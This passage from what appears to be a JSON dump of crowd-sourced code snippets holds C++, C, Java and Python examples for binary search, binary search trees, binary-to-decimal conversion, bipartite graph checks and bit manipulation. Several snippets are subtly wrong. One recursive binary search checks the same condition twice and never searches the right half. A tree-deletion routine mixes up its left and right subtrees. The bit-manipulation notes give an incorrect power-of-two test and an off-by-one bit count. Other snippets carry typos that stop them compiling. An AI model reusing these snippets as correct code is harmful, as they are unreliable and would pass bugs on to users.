array[size] = {1, 2, 3, 4, 5}; // declare array of size 10     int value; // declare value to be searched for     int result; // declare variable that will be returned after binary search      cout << \"What value would you like to search for? \"; // prompt user to enter value     cin >> value;     result = binarySearch(array, size, value);      if (result == -1) // if value isn't found display this message         cout << \"Not found\\n\";     else  // If value is found, displays message         cout << \"Your value is in the array.\\n\";         return 0; }\n// BY shivam kumar KIIT #include<bits/stdc++.h> usind namespace std; int main() { \tint arr[]={10,2,34,2,5,4,1};   \tsort(arr,arr+7);//sort array in ascending order before using binary search   \tbinary_search(arr,arr+7,10);//return 1 as element is found   \tbinary_search(arr,arr+7,3);//return 0 as element is not found   \treturn 0; }\n#include<iostream>  using namespace std;  int binarySearch(int arr[], int p, int r, int num) {     if (p <= r) {        int mid = (p + r)/2;        if (arr[mid] == num)             return mid ;        if (arr[mid] > num)            return binarySearch(arr, p, mid-1, num);                   if (arr[mid] < num)          return binarySearch(arr, mid+1, r, num);     }     return -1;  }  int main(void) {     int arr[] = {1, 3, 7, 15, 18, 20, 25, 33, 36, 40};     int n = sizeof(arr)/ sizeof(arr[0]);     int num = 33;     int index = binarySearch (arr, 0, n-1, num);     if(index == -1)       cout<< num <<\" is not present in the array\";    else       cout<< num <<\" is present at index \"<< index <<\" in the array\";     return 0;  }\n#include<iostream> using namespace std; int binarySearch(int arr[], int p, int r, int num) {    if (p <= r) {       int mid = (p + r)/2;       if (arr[mid] == num)       return mid ;       if (arr[mid] > num)       return binarySearch(arr, p, mid-1, num);       if (arr[mid] > num)       return binarySearch(arr, mid+1, r, num);    }    return -1; } int main(void) {    int arr[] = {1, 3, 7, 15, 18, 20, 25, 33, 36, 40};    int n = sizeof(arr)/ sizeof(arr[0]);    int num = 33;    int index = binarySearch (arr, 0, n-1, num);    if(index == -1)    cout<< num <<\" is not present in the array\";    else    cout<< num <<\" is present at index \"<< index <<\" in the array\";    return 0; }\n//requires header <algorithm> for std::binary_search #include <algorithm> #include <vector>  bool binarySearchVector(const std::vector<int>& vector,                        \tint target) {   //this line does all binary searching   return std::binary_search(vector.cbegin(), vector.cend(), target); }  #include <iostream>  int main() {     std::vector<int> haystack {1, 3, 4, 5, 9};     std::vector<int> needles {1, 2, 3};       for (auto needle : needles) {         std::cout << \"Searching for \" << needle << std::endl;         if (binarySearchVector(haystack, needle)) {             std::cout << \"Found \" << needle << std::endl;         } else {             std::cout << \"no dice!\" << std::endl;         }     } }\n//By Sudhanshu Sharan #include<iostream> #include<cmath> using namespace std; // BCT= o(1)  and  WCT=O(logn)   time taken for unsucessful search is always o(logn)  int BinSearch( int arr[],int key,int len) { \tint h,mid,l; \tl=0; \th=len-1; \twhile(l<=h) \t{ \t\tmid=((l+h)/2); \t\tif(key==arr[mid]) \t\t\treturn mid; \t\telse if(key<arr[mid]) \t\t\th=mid-1; \t\telse \t\t\tl=mid+1; \t} \treturn -1; } int main() { \tint key,i,len; \tint arr[] = {1,2,3,6,9,12,15,34,54}; \tlen=sizeof(arr)/sizeof(arr[0]); \tcout<<\"enter the key to be searched\"; \tcin>>key; \tint result= BinSearch(arr,key,len); \t(result == -1) \t\t? cout<<\"Element is not present in the array\"<<endl \t\t: cout<<\"Element is present at index : \"<<result<<endl;\t \tfor(i=0;i<len-1;i++) \t\tcout<<arr[i]<<\" \";     return 0; }\n",
    "reg_date": "2021-10-12T11:37:30.000Z"
  },
  {
    "id": 605,
    "keyword": null,
    "link": null,
    "title": " binary search in c++",
    "description": "#include <iostream> using namespace std;  // This program performs a binary search through an array, must be sorted to work int binarySearch(int array[], int size, int value)  {        int first = 0,         // First array element            last = size - 1,       // Last array element            middle,                // Mid point of search            position = -1;         // Position of search value        bool found = false;        // Flag        while (!found && first <= last)      {               middle = (first + last) / 2;     // Calculate mid point               if (array[middle] == value)      // If value is found at mid           \t{                          found = true;                          position = middle;               }               else if (array[middle] > value)  // If value is in lower half                      last = middle - 1;               else                      first = middle + 1;          // If value is in upper half        }        return position; } int main () {     const int size = 5; // size initialization     int array[size] = {1, 2, 3, 4, 5}; // declare array of size 10     int value; // declare value to be searched for     int result; // declare variable that will be returned after binary search      cout << \"What value would you like to search for? \"; // prompt user to enter value     cin >> value;     result = binarySearch(array, size, value);      if (result == -1) // if value isn't found display this message         cout << \"Not found\\n\";     else  // If value is found, displays message         cout << \"Your value is in the array.\\n\";         return 0; }\n// BY shivam kumar KIIT #include<bits/stdc++.h> usind namespace std; int main() { \tint arr[]={10,2,34,2,5,4,1};   \tsort(arr,arr+7);//sort array in ascending order before using binary search   \tbinary_search(arr,arr+7,10);//return 1 as element is found   \tbinary_search(arr,arr+7,3);//return 0 as element is not found   \treturn 0; }\n#include<iostream>  using namespace std;  int binarySearch(int arr[], int p, int r, int num) {     if (p <= r) {        int mid = (p + r)/2;        if (arr[mid] == num)             return mid ;        if (arr[mid] > num)            return binarySearch(arr, p, mid-1, num);                   if (arr[mid] < num)          return binarySearch(arr, mid+1, r, num);     }     return -1;  }  int main(void) {     int arr[] = {1, 3, 7, 15, 18, 20, 25, 33, 36, 40};     int n = sizeof(arr)/ sizeof(arr[0]);     int num = 33;     int index = binarySearch (arr, 0, n-1, num);     if(index == -1)       cout<< num <<\" is not present in the array\";    else       cout<< num <<\" is present at index \"<< index <<\" in the array\";     return 0;  }\n#include<iostream> using namespace std; int binarySearch(int arr[], int p, int r, int num) {    if (p <= r) {       int mid = (p + r)/2;       if (arr[mid] == num)       return mid ;       if (arr[mid] > num)       return binarySearch(arr, p, mid-1, num);       if (arr[mid] > num)       return binarySearch(arr, mid+1, r, num);    }    return -1; } int main(void) {    int arr[] = {1, 3, 7, 15, 18, 20, 25, 33, 36, 40};    int n = sizeof(arr)/ sizeof(arr[0]);    int num = 33;    int index = binarySearch (arr, 0, n-1, num);    if(index == -1)    cout<< num <<\" is not present in the array\";    else    cout<< num <<\" is present at index \"<< index <<\" in the array\";    return 0; }\n//requires header <algorithm> for std::binary_search #include <algorithm> #include <vector>  bool binarySearchVector(const std::vector<int>& vector,                        \tint target) {   //this line does all binary searching   return std::binary_search(vector.cbegin(), vector.cend(), target); }  #include <iostream>  int main() {     std::vector<int> haystack {1, 3, 4, 5, 9};     std::vector<int> needles {1, 2, 3};       for (auto needle : needles) {         std::cout << \"Searching for \" << needle << std::endl;         if (binarySearchVector(haystack, needle)) {             std::cout << \"Found \" << needle << std::endl;         } else {             std::cout << \"no dice!\" << std::endl;         }     } }\n//By Sudhanshu Sharan #include<iostream> #include<cmath> using namespace std; // BCT= o(1)  and  WCT=O(logn)   time taken for unsucessful search is always o(logn)  int BinSearch( int arr[],int key,int len) { \tint h,mid,l; \tl=0; \th=len-1; \twhile(l<=h) \t{ \t\tmid=((l+h)/2); \t\tif(key==arr[mid]) \t\t\treturn mid; \t\telse if(key<arr[mid]) \t\t\th=mid-1; \t\telse \t\t\tl=mid+1; \t} \treturn -1; } int main() { \tint key,i,len; \tint arr[] = {1,2,3,6,9,12,15,34,54}; \tlen=sizeof(arr)/sizeof(arr[0]); \tcout<<\"enter the key to be searched\"; \tcin>>key; \tint result= BinSearch(arr,key,len); \t(result == -1) \t\t? cout<<\"Element is not present in the array\"<<endl \t\t: cout<<\"Element is present at index : \"<<result<<endl;\t \tfor(i=0;i<len-1;i++) \t\tcout<<arr[i]<<\" \";     return 0; }\n",
    "reg_date": "2021-10-12T11:37:30.000Z"
  },
  {
    "id": 606,
    "keyword": null,
    "link": null,
    "title": " binary search in vector in c++",
    "description": "#include <bits/stdc++.h> #include <iostream> #include <vector> #include <algorithm>  using namespace std; //defining the comparator function returns true or false //not for binary search.. bool f(int x, int y){ \treturn x>y; //for decreasing order } \t int main() { \t \tvector<int> A ={ 11,2,3,14 }; \tcout<<A[1]<<endl;//2    \tsort(A.begin(), A.end()); // sort in order to perform binary search \tcout<<A[1]<<endl;//3 after sorting \t \tbool present = binary_search(A.begin(), A.end(), 3); \tcout<<present<<endl;//will return true    \tpresent = binary_search(A.begin(), A.end(), 5); \tcout<<present<<endl;//will return false    \tA.push_back(100);//inserting new element from end    \tpresent = binary_search(A.begin(), A.end(), 100); \tcout<<present<<endl;       \tA.push_back(100); \tA.push_back(100); \tA.push_back(100); \tA.push_back(121); \t \t//give me the iterator pointing to first element >= 100 \tvector<int>::iterator it = lower_bound(A.begin(), A.end(), 100); \t//you can also use auto as c++ will see that a lower_bound is performed \t//and it will figur it out that it is an iterator of vector<int> \t//auto it = lower_bound(A.begin(), A.end(), 100); \t//auto it2 = upper_bound(A.begin(), A.end(), 100); \t \t \t \t//give me an iterator pointing to first element >100 \tvector<int>::iterator it2 = upper_bound(A.begin(), A.end(), 100); \t \t//print the content of it and it2 \tcout<<*it<<\" \"<<*it2<<endl; \t \t//give me the number of hundreds(100) \tcout<<it2-it<<endl; //4 it subtracts the indices  \t \t \t//soritng the vector in reverse order \t//use method overloading with sort by passing a comparator function  \t//to control the ordering \tsort(A.begin(), A.end(), f); \t \t//now print the sorted vector using iterator \tvector<int>::iterator it3; \t \tfor (it3 =A.begin(); it3!= A.end(); it3++){ \t\tcout<<*it3<<\" \"; \t} \tcout<<endl; \t \t//A shorter code for the above will be \tfor(int x: A){ \t\t//x++ wont change the vector content it will only print the changed one \t\tcout<<x<<\" \"; \t} \tcout<<endl; \t \t//to change the vector content while iterating \t//iterate it by referance by using &x \tfor(int &x: A){ \t\tx++; \t\tcout<<x<<\" \"; \t} \tcout<<endl;    \treturn 0; }\n",
    "reg_date": "2021-10-12T11:37:30.000Z"
  },
  {
    "id": 607,
    "keyword": null,
    "link": null,
    "title": " binary search program c++",
    "description": "#include <iostream> using namespace std;  // This program performs a binary search through an array, must be sorted to work int binarySearch(int array[], int size, int value)  {        int first = 0,         // First array element            last = size - 1,       // Last array element            middle,                // Mid point of search            position = -1;         // Position of search value        bool found = false;        // Flag        while (!found && first <= last)      {               middle = (first + last) / 2;     // Calculate mid point               if (array[middle] == value)      // If value is found at mid           \t{                          found = true;                          position = middle;               }               else if (array[middle] > value)  // If value is in lower half                      last = middle - 1;               else                      first = middle + 1;          // If value is in upper half        }        return position; } int main () {     const int size = 5; // size initialization     int array[size] = {1, 2, 3, 4, 5}; // declare array of size 10     int value; // declare value to be searched for     int result; // declare variable that will be returned after binary search      cout << \"What value would you like to search for? \"; // prompt user to enter value     cin >> value;     result = binarySearch(array, size, value);      if (result == -1) // if value isn't found display this message         cout << \"Not found\\n\";     else  // If value is found, displays message         cout << \"Your value is in the array.\\n\";         return 0; }\n#include<iostream>  using namespace std;  int binarySearch(int arr[], int p, int r, int num) {     if (p <= r) {        int mid = (p + r)/2;        if (arr[mid] == num)             return mid ;        if (arr[mid] > num)            return binarySearch(arr, p, mid-1, num);                   if (arr[mid] < num)          return binarySearch(arr, mid+1, r, num);     }     return -1;  }  int main(void) {     int arr[] = {1, 3, 7, 15, 18, 20, 25, 33, 36, 40};     int n = sizeof(arr)/ sizeof(arr[0]);     int num = 33;     int index = binarySearch (arr, 0, n-1, num);     if(index == -1)       cout<< num <<\" is not present in the array\";    else       cout<< num <<\" is present at index \"<< index <<\" in the array\";     return 0;  }\n",
    "reg_date": "2021-10-12T11:37:30.000Z"
  },
  {
    "id": 608,
    "keyword": null,
    "link": null,
    "title": " binary search return index c++",
    "description": "int binarySearch(vector<int>& arr, int p, int r, int num) {         while (p <= r) {             int mid = (p + r)/2;                          if (arr[mid] == num) return mid;             else if (arr[mid] > num) r = mid-1;             else  p = mid+1;         }         return -1;     }\n#include<iostream> using namespace std; int binarySearch(int arr[], int p, int r, int num) {    if (p <= r) {       int mid = (p + r)/2;       if (arr[mid] == num)       return mid ;       if (arr[mid] > num)       return binarySearch(arr, p, mid-1, num);       if (arr[mid] > num)       return binarySearch(arr, mid+1, r, num);    }    return -1; } int main(void) {    int arr[] = {1, 3, 7, 15, 18, 20, 25, 33, 36, 40};    int n = sizeof(arr)/ sizeof(arr[0]);    int num = 33;    int index = binarySearch (arr, 0, n-1, num);    if(index == -1)    cout<< num <<\" is not present in the array\";    else    cout<< num <<\" is present at index \"<< index <<\" in the array\";    return 0; }\n",
    "reg_date": "2021-10-12T11:37:30.000Z"
  },
  {
    "id": 609,
    "keyword": null,
    "link": null,
    "title": " binary search tree in cpp using class",
    "description": "/* Program to implement Binary Search Tree in c++ using classes  */ #include<iostream> #include<stdlib.h> #include<cstdlib> using namespace std;  struct Node {     int data;     Node* left;     Node* right; };  class BinaryTree {     private:         struct Node* root;     public:         BinaryTree() {             root = NULL;         }         Node* createNode(int);         Node* insertNode(Node*, int);         Node* deleteNode(Node*, int);         void inOrder(Node*);         void preOrder(Node*);         void postOrder(Node*);         Node* findMinimum(Node*);          Node* getRoot() {             return root;         }          void setRoot(Node* ptr) {             root = ptr;          } };  Node* BinaryTree :: createNode(int n) {     Node* newNode = new struct Node();     newNode->data = n;     newNode->left = NULL;     newNode->right = NULL;     return newNode;  }   Node* BinaryTree :: findMinimum(Node* rootPtr) {     while(rootPtr->left != NULL) {         rootPtr = rootPtr->left;     }     return rootPtr; }   Node* BinaryTree :: insertNode(Node* rootPtr, int n) {     if(rootPtr == NULL) {         return createNode(n);     }     if(n < rootPtr->data) {         rootPtr->left = insertNode(rootPtr->left, n);     }     if(n > rootPtr->data) {         rootPtr->right = insertNode(rootPtr->right, n);     }     return rootPtr; }   Node* BinaryTree :: deleteNode(Node* rootPtr, int n) {     if(rootPtr == NULL) {         cout<<\"Node to be deleted is not present.!\"<<endl;         return rootPtr;     }     else if(n < rootPtr->data) {         rootPtr->left = deleteNode(rootPtr->left, n);     } else if(n > rootPtr->data) {         rootPtr->right = deleteNode(rootPtr->right, n);     } else {         if(rootPtr->left == NULL && rootPtr->right == NULL) {             delete rootPtr;             rootPtr = NULL;         }         else if(root->left == NULL) {             struct Node* temp = rootPtr;             rootPtr = rootPtr->right;             delete temp;         }         else if(rootPtr->right == NULL) {             struct Node* temp = rootPtr;             rootPtr = rootPtr->left;             delete temp;         } else {             Node* temp = findMinimum(rootPtr->right);             rootPtr->data = temp->data;             rootPtr->left = deleteNode(rootPtr->right, temp->data);         }     }      return rootPtr; }   void BinaryTree :: inOrder(Node* root) {     if(root == NULL) {         return;     }     inOrder(root->left);     cout<<root->data<<\"\\t\";     inOrder(root->right); }  void BinaryTree :: preOrder(Node* root) {     if(root == NULL) return;     cout<<root->data<<\"\\t\";     preOrder(root->left);     preOrder(root->right); }  void BinaryTree :: postOrder(Node* root) {     if(root == NULL) return;     postOrder(root->left);     postOrder(root->right);     cout<<root->data<<\"\\t\"; }  int main() {     BinaryTree l1;     int ch, ele, res;     Node* ptr;     do {             cout<<\"1 - Insert Node\\n\";             cout<<\"2 - IN-ORDER Traversal\\n\";             cout<<\"3 - PRE-ORDER Traversal\\n\";             cout<<\"4 - POST-ORDER Traversal\\n\";             cout<<\"Enter choice\\n\";             cin>>ch;             switch(ch) {                 case 1:                      cout<<\"Entre element to insert to the List\\n\";                     cin>>ele;                      ptr = l1.insertNode(l1.getRoot(), ele);                        l1.setRoot(ptr);                     break;                 case 2:                     cout<<\"---IN-ORDER TRAVERSAL---\"<<endl;                     l1.inOrder(l1.getRoot());                     cout<<endl;                     break;                 case 3:                     cout<<\"---PRE-ORDER TRAVERSAL---\"<<endl;                     l1.preOrder(l1.getRoot());                     cout<<endl;                     break;                 case 4:                     cout<<\"---POST-ORDER TRAVERSAL---\"<<endl;                     l1.postOrder(l1.getRoot());                     cout<<endl;                     break;                 case 5:                     cout<<\"Enter node to be deleted.\"<<endl;                     cin>>ele;                     ptr = l1.deleteNode(l1.getRoot(), ele);                     l1.setRoot(ptr);                 default: cout<<\"Invalid choice\"<<endl;             }     } while(ch >=1 && ch <= 5);     return 0; }\n",
    "reg_date": "2021-10-12T11:37:31.000Z"
  },
  {
    "id": 610,
    "keyword": null,
    "link": null,
    "title": " binary search tree sorted order",
    "description": "#include <iostream>  using namespace std; class node { public:     int data;     node*left;     node*right; }; node*getnewnode(int val) {     node*temp=new node;     temp->data=val;     temp->left=NULL;     temp->right=NULL;     return temp; } node*insertbst(node *root,int val) {     if(root==NULL)     {         return getnewnode(val);     }     if(root->data>val)     {         root->left=insertbst(root->left,val);     }     else if(root->data<val)     {         root->right=insertbst(root->right,val);     }     return root; } void inorder(node*root) {     if(root==NULL)     {         return;     }     else     {         inorder(root->left);         cout<<root->data<<\" \";         inorder(root->right);     } }  int main() {     node *root=new node;     root=NULL;     root=insertbst(root,100);     root=insertbst(root,200);     root=insertbst(root,50);     root=insertbst(root,90);     root=insertbst(root,150);     inorder(root);     return 0; } \n",
    "reg_date": "2021-10-12T11:37:31.000Z"
  },
  {
    "id": 611,
    "keyword": null,
    "link": null,
    "title": " binary sort c++",
    "description": "int binarySearch(int a[], int item, int low, int high) {     if (high <= low)         return (item > a[low]) ?                  (low + 1) : low;       int mid = (low + high) / 2;       if (item == a[mid])         return mid + 1;       if (item > a[mid])         return binarySearch(a, item,                              mid + 1, high);     return binarySearch(a, item, low,                          mid - 1); }\n#include<iostream>  using namespace std;  int binarySearch(int arr[], int p, int r, int num) {     if (p <= r) {        int mid = (p + r)/2;        if (arr[mid] == num)             return mid ;        if (arr[mid] > num)            return binarySearch(arr, p, mid-1, num);                   if (arr[mid] < num)          return binarySearch(arr, mid+1, r, num);     }     return -1;  }  int main(void) {     int arr[] = {1, 3, 7, 15, 18, 20, 25, 33, 36, 40};     int n = sizeof(arr)/ sizeof(arr[0]);     int num = 33;     int index = binarySearch (arr, 0, n-1, num);     if(index == -1)       cout<< num <<\" is not present in the array\";    else       cout<< num <<\" is present at index \"<< index <<\" in the array\";     return 0;  }\n",
    "reg_date": "2021-10-12T11:37:31.000Z"
  },
  {
    "id": 612,
    "keyword": null,
    "link": null,
    "title": " binary to decimal",
    "description": "import java.util.Scanner; public class BinaryToDecimalDemo  {    public static void main(String[] args)     {       int number, decimal = 0, a = 0;       Scanner sc = new Scanner(System.in);       System.out.println(\"Please enter binary number: \");       String strBinary = sc.nextLine();       number = Integer.parseInt(strBinary);       while(number != 0){          decimal += (number % 10) * Math.pow(2, a);          number = number / 10;          a++;       }       System.out.println(\"Decimal number: \" + decimal);       sc.close();    } }\n#include <math.h> #include <stdio.h> int convert(long long n); int main() {     long long n;     printf(\"Enter a binary number: \");     scanf(\"%lld\", &n);     printf(\"%lld in binary = %d in decimal\", n, convert(n));     return 0; }  int convert(long long n) {     int dec = 0, i = 0, rem;     while (n != 0) {         rem = n % 10;         n /= 10;         dec += rem * pow(2, i);         ++i;     }     return dec; } \ndouble binaryToDecimal(char binary[DIM]) { \tchar binary2[DIM] = \"\", floa[DIM] = \"\"; \tdouble decimal = 0, negDec = 0, flo = 0; \tint count = 0, j = 0, i = 0, f = 0, g = 0, h = 0, count1 = 0, d = 0, k = 0; \twhile (binary[d] != '\\0'&&binary[d] != '.') { d++; } \td--; \tif (binary[0] == '-') { \t\twhile (binary[k] != '\\0') { \t\t\tbinary[k] = binary[k + 1]; \t\t\tk++; \t\t} \t\tk = 0; \t\twhile (binary[k] == '0') { \t\t\td--; \t\t\tk++; \t\t} \t\tnegDec = pot(2.000, d*1.000, 1); \t} \twhile (binary[i] != '\\0'&&binary[i] != '.') { \t\ti++; \t} \ti--; \tcount = i; \th = i; \twhile (binary[h] != '\\0') { \t\tfloa[g] = binary[h + 2]; \t\tg++; \t\th++; \t} \tg--; \tcount1 = g; \twhile (i >= 0) { \t\tbinary2[j] = binary[i]; \t\ti--; \t\tj++; \t} \tbinary2[j] = '\\0'; \twhile (i <= count) { \t\tif (binary2[i] == '1') { \t\t\tdecimal = decimal + pot(2.000, i, 1); \t\t} \t\ti++; \t} \th = -1; \tg = 0; \twhile (g <= count1) { \t\tif (floa[g] == '1') { \t\t\tflo = flo + pot(2.000, h, 1); \t\t} \t\tg++; \t\th--; \t} \tdecimal = decimal + flo; \tif (negDec > 0) { \t\tdecimal = (decimal - negDec); \t\tif (flo > 0) { \t\t\tdouble f = fl(decimal); \t\t\tf = 1 - f; \t\t\tdecimal = returnDeciPart(decimal) - f; \t\t} \t} \treturn decimal; }\nbinary 10 = 2 denary\nimport java.util.Scanner;  public class BinaryToDecimal {  \tpublic static void main(String[] args) { \t\t// TODO Auto-generated method stub \t\tScanner sc = new Scanner(System.in); \t\tString binary = sc.next(); \t\t// This is one line solution for binary to decimal in java \t\tSystem.out.println(Integer.parseInt(binary,2)); \t\t \t\t//This solution is based on formula for binary to decimal conversion \t\tint n=0,dec=0; \t\tfor(int i=binary.length()-1;i>=0;i--) \t\t{ \t\t\tdec = dec + Integer.parseInt(String.valueOf(binary.charAt(i)))*(int)Math.pow(2,n); \t\t\tn++; \t\t} \t\tSystem.out.println(dec);  \t}  } \n",
    "reg_date": "2021-10-12T11:37:31.000Z"
  },
  {
    "id": 613,
    "keyword": null,
    "link": null,
    "title": " binary tree deletion",
    "description": "//insertion;deletion;searching;dispaly;menu driven program ;(BINARY SEARCH TREE) #include <iostream>  using namespace std; class node { public:     int data;     node*right;     node*left; }; node*getnewnode(int val) {     node *temp=new node;     temp->data=val;     temp->left=NULL;     temp->right=NULL;    return temp; } int getrightmin(node*root) {     node*temp=new node;     temp=root;     while(temp->left!=NULL)     {         temp=temp->left;     }     return temp->data; } node*insertbst(node*root,int val) {     if(root==NULL)     {         return getnewnode(val);     }     if(root->data>val)     {         root->left= insertbst(root->left,val);     }     else     {         root->right= insertbst(root->right,val);     }     return root; } int searchbst(node*root,int val) {     if(root==NULL)     {         return 0;     }     if(root->data==val)     {         return 1;     }     if(root->data<val)     {         return searchbst(root->right,val);     }     else     {         return searchbst(root->left,val);     } } node*removebst(node*root,int val) {     if(root==NULL)     {         return 0;     }     if(root->data>val)     {         root->left=removebst(root->left,val);     }     else if(root->data<val)     {         root->right=removebst(root->right,val);     }     else     {         if(root->left==NULL&&root->right==NULL)         {             delete root;             return NULL;         }         else if(root->left==NULL)         {             node*temp=new node;             temp=root->right;             delete root;             return temp;         }         else if(root->right==NULL)         {             node*temp=new node;             temp=root->left;             delete root;             return temp;         }         else         {             int min=getrightmin(root->right);             root->data=min;             root->right=removebst(root->right,min);         }     }     return root; } void inorder(node*root) {     if(root==NULL)     {         return;     }     inorder(root->left);     cout<<root->data<<\" \";     inorder(root->right); } int main() {     node*root=new node;     root=NULL;     while(1)     {         int value;         cout<<\"1.Insert to bst\"<<endl<<\"2.search in bst:\"<<endl<<\"3.display ordered bst\"<<endl<<\"4. exit\"<<endl<<\"5. delete \"<<endl;         int n;         cout<<\"enter your choice:\"<<endl;         cin>>n;         switch(n)         {         case 1:             {                 cout<<\"enter the value to be inserted:\"<<endl;                 cin>>value;                 root=insertbst(root,value);                 break;             }         case 2:             {                 cout<<\"enter the value you want to search:\"<<endl;                 int search;                 cin>>search;                 int s=searchbst(root,search);                 if(s==1)                 {                     cout<<\"value found\"<<endl;                 }                 else                 {                     cout<<\"value not found:\"<<endl;                 }                 break;             }         case 3:             {                 inorder(root);                 cout<<endl;                 break;             }         case 4:             {                 exit(0);                 break;             }         case 5:             {                 int val;                 cout<<\"enter the value to be deleted:\"<<endl;                 cin>>val;                 removebst(root,val);                 break;              }         default:             {                 cout<<\"invalid choice given:\"<<endl;                 break;             }          }     }     return 0; } \n/* This is just the deletion function you need to write the required code. \tThank you. */  void deleteNode(Node *root, int data) {     if(root == NULL)     {         cout << \"Tree is empty\\n\";         return;     }      queue<Node*> q;     q.push(root);      while(!q.empty())     {         Node *temp = q.front();         q.pop();          if(temp->data == data)         {             Node *current = root;             Node *prev;              while(current->right != NULL)             {                 prev = current;                 current = current->right;             }              temp->data = current->data;             prev->right = NULL;             free(current);              cout << \"Deleted\\n\";              return;         }          if(temp->left != NULL)             q.push(temp->left);         if(temp->right != NULL)             q.push(temp->right);     }      cout << \"Node not found for deletion\\n\"; }\n",
    "reg_date": "2021-10-12T11:37:31.000Z"
  },
  {
    "id": 614,
    "keyword": null,
    "link": null,
    "title": " binary tree search",
    "description": "/* This is just the seaching function you need to write the required code. \tThank you. */  void searchNode(Node *root, int data) {     if(root == NULL)     {         cout << \"Tree is empty\\n\";         return;     }      queue<Node*> q;     q.push(root);      while(!q.empty())     {         Node *temp = q.front();         q.pop();          if(temp->data == data)         {             cout << \"Node found\\n\";             return;         }          if(temp->left != NULL)             q.push(temp->left);         if(temp->right != NULL)             q.push(temp->right);     }      cout << \"Node not found\\n\"; }\nBinary Search Tree is a node-based binary tree data structure which has the following properties:  The left subtree of a node contains only nodes with keys lesser than the node&rsquo;s key. The right subtree of a node contains only nodes with keys greater than the node&rsquo;s key. The left and right subtree each must also be a binary search tree. \n# Driver Code  arr = [ 2, 3, 4, 10, 40 ]  x = 10    # Function call  result = binarySearch(arr, 0, len(arr)-1, x)     if result != -1:      print (\"Element is present at index % d\" % result)  else:      print (\"Element is not present in array\")\n",
    "reg_date": "2021-10-12T11:37:31.000Z"
  },
  {
    "id": 615,
    "keyword": null,
    "link": null,
    "title": " bipartite graph",
    "description": "Bipartite Graph-    A bipartite graph is a special kind of graph with the following properties-  It consists of two sets of vertices X and Y. The vertices of set X join only with the vertices of set Y. The vertices within the same set do not join.    \n//Bipartite Graph (BFS)/ Graph coloring //Do check striver graph series #include<bits/stdc++.h> using namespace std; void addedge(vector<int>adj[],int u,int v) {     adj[u].push_back(v);     adj[v].push_back(u); } bool bfsbipar(int source_node,vector<int>adj[],int color[]) {     queue<int>q;     q.push(source_node);     color[source_node]=0;     while(!q.empty())     {         int f=q.front();         q.pop();         for(auto i:adj[f])         {             if(color[i]==-1)             {                 if(color[f]==1)                 {                     color[i]=0;                 }                 else                 {                     color[i]=1;                 }                 q.push(i);             }             else if(color[i]==color[f])             {                 return false;             }         }     }     return true; } bool checkbipar(vector<int>adj[],int n) {     int color[n];     for(int i=0;i<n;i++)     {         color[i]=-1;     }     for(int i=0;i<n;i++)     {         if(color[i]==-1)         {             if(!bfsbipar(i,adj,color))             {                 return false;             }         }     }     return true; } int main() {     int n,v;     cout<<\"Enter the number of vertex, edges: \";     cin>>n>>v;     int a,b;     vector<int>adj[n];     cout<<\"enter the link:\"<<endl;     for(int i=0;i<v;i++)     {         cin>>a>>b;         addedge(adj,a,b);     }     if(checkbipar(adj,n))     {         cout<<\"YES\"<<endl;     }     else     {         cout<<\"NO\"<<endl;     }     return 0; } \n",
    "reg_date": "2021-10-12T11:37:31.000Z"
  },
  {
    "id": 616,
    "keyword": null,
    "link": null,
    "title": " bipartite graph dfs",
    "description": "//Bipartite graph / Graph coloring //Using DFS(recursion)  #include<bits/stdc++.h> using namespace std; void addedge(vector<int>adj[],int u,int v) {     adj[u].push_back(v);     adj[v].push_back(u); } bool bipar(int sr,vector<int>adj[],int color[]) {     if(color[sr]==-1)     {         color[sr]=1;     }     for(auto i:adj[sr])     {         if(color[i]==-1)         {             color[i]=1-color[sr];             if(!bipar(i,adj,color))             {                 return false;             }         }         else if(color[i]==color[sr])         {             return false;         }     }     return true; } bool checkbipar(vector<int>adj[],int n) {     int color[n];     for(int i=0;i<n;i++)     {         color[i]=-1;     }     for(int i=0;i<n;i++)     {         if(color[i]==-1)         {             if(!bipar(i,adj,color))             {                 return false;             }         }     }     return true; } int main() {     int n,v;     cout<<\"Enter the no. of vertex and edges:\";     cin>>n>>v;     vector<int>adj[n];     int a,b;     cout<<\"enter the links:\"<<endl;     for(int i=0;i<n;i++)     {         cin>>a>>b;         addedge(adj,a,b);     }     if(checkbipar(adj,n))     {         cout<<\"YES\"<<endl;     }     else     {         cout<<\"NO\"<<endl;     } } \n",
    "reg_date": "2021-10-12T11:37:31.000Z"
  },
  {
    "id": 617,
    "keyword": null,
    "link": null,
    "title": " bit c++",
    "description": "Set ith bit:    x|(1<<i) Get ith bit:    (x&(1<<i) != 0) Clear ith bit:   x&(~(1<<i))\n",
    "reg_date": "2021-10-12T11:37:31.000Z"
  },
  {
    "id": 618,
    "keyword": null,
    "link": null,
    "title": " bit manupulation in c++",
    "description": "Bitwise Operator //if both are true then true else false & //if both are false then false else true | //changes true into false and vice-versa ~ //returns true if exactly one is true else false //checks if both are different ^ //a<<b multiply a with 2 , b times << //a>>b divide a with 2 ,  b times >> ------------------------------------------------- check whether a numbe is a power of 2 i.e if it comes in the format 2**n int x; cin >>x; cout<<~(x&(x-1)); ------------------------------------------------- count no of ones in the binary representation of th given number int count = 1; while(n!=0){     count++;     n = n&(n-1); } ------------------------------------------------- check whether the i'th bit is set or not i.e 1 for the binary of number n if(n & (1<<i) == true){     cout<<\"Yes it is a bit\" } ------------------------------------------------- \n",
    "reg_date": "2021-10-12T11:37:31.000Z"
  },
  {
    "id": 619,
    "keyword": null,
    "link": null,
    "title": " bit masking tricks",
    "description": "Setting a bit Use the bitwise OR operator (|) to set a bit.  number |= 1UL << n; That will set the nth bit of number. n should be zero, if you want to set the 1st bit and so on upto n-1, if you want to set the nth bit.  Use 1ULL if number is wider than unsigned long; promotion of 1UL << n doesn't happen until after evaluating 1UL << n where it's undefined behaviour to shift by more than the width of a long. The same applies to all the rest of the examples.  Clearing a bit Use the bitwise AND operator (&) to clear a bit.  number &= ~(1UL << n); That will clear the nth bit of number. You must invert the bit string with the bitwise NOT operator (~), then AND it.  Toggling a bit The XOR operator (^) can be used to toggle a bit.  number ^= 1UL << n; That will toggle the nth bit of number.  Checking a bit You didn't ask for this, but I might as well add it.  To check a bit, shift the number n to the right, then bitwise AND it:  bit = (number >> n) & 1U; That will put the value of the nth bit of number into the variable bit.  Changing the nth bit to x Setting the nth bit to either 1 or 0 can be achieved with the following on a 2's complement C++ implementation:  number ^= (-x ^ number) & (1UL << n); Bit n will be set if x is 1, and cleared if x is 0. If x has some other value, you get garbage. x = !!x will booleanize it to 0 or 1.  To make this independent of 2's complement negation behaviour (where -1 has all bits set, unlike on a 1's complement or sign/magnitude C++ implementation), 